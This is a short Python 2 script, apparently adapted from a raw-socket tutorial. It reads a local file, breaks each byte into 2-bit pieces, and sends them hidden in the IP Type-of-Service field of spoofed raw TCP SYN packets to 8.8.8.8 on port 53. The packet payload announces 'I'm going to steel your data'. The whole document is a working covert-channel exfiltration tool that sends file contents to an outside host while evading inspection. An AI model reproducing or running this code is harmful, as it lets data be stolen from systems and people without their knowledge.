#http://www.binarytides.com/raw-socket-programming-in-python-linux/
import socket, sys
from struct import *
qos_list = []
with open("f.txt", "rb") as f:
    byte = f.read(1)
    while byte:
        qos_list.append((ord(byte) & 192)>>6)
        qos_list.append((ord(byte) & 48)>>4)
        qos_list.append((ord(byte) & 12)>>2)
        qos_list.append((ord(byte) & 3))
        byte = f.read(1)
f.close()
#f = open('o.txt', 'wb')
#for b in range(0, len(qos_list), 4):
#    byte = qos_list[b]<<6 | qos_list[b+1]<<4 | qos_list[b+2]<<2 | qos_list[b+3]
#    f.write(chr(byte))
#f.close()    

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)
except socket.error , msg:
    print 'Socket could not be created. Error Code: ' + str(msg[0]) + ' Messgae: ' + msg[1]
    sys.exit()
packet = ''
ip_src = '192.168.0.5'
ip_dst = '8.8.8.8'
ip_ihl = 5
ip_ver = 4
#ip_tos = 24
ip_len = 0
ip_id = 54321
ip_df = 32768
ip_ttl = 255
ip_prot = socket.IPPROTO_TCP
ip_check = 0
ip_src_addr = socket.inet_aton(ip_src)
ip_dst_addr = socket.inet_aton(ip_dst)
ip_ihl_ver = (ip_ver <<4 ) + ip_ihl

tcp_src = 40000
tcp_dst = 53
tcp_seq = 1
tcp_ack_seq = 0
tcp_doff = 5
tcp_fin = 0
tcp_syn = 1
tcp_rst = 0
tcp_psh = 0
tcp_ack = 0
tcp_urg = 0
tcp_window = socket.htons(5840)
tcp_check =0
tcp_urg_ptr = 0
tcp_offset_res = (tcp_doff << 4) +0
tcp_flags = tcp_fin + (tcp_syn <<1) + (tcp_rst <<2) + (tcp_psh<<3) + (tcp_ack<<4) + (tcp_urg<<5)

tcp_header = pack('!HHLLBBHHH', tcp_src, tcp_dst, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
data = 'I\'m going to steel your data'

for t in qos_list:
	ip_id += 1
	ip_tos = (t+1)*32
	ip_header = pack('!BBHHHBBH4s4s',ip_ihl_ver,ip_tos,ip_len,ip_id,ip_df,ip_ttl,ip_prot,ip_check,ip_src_addr,ip_dst_addr)
	packet = ip_header + tcp_header + data
	s.sendto(packet,('8.8.8.8',6))
	
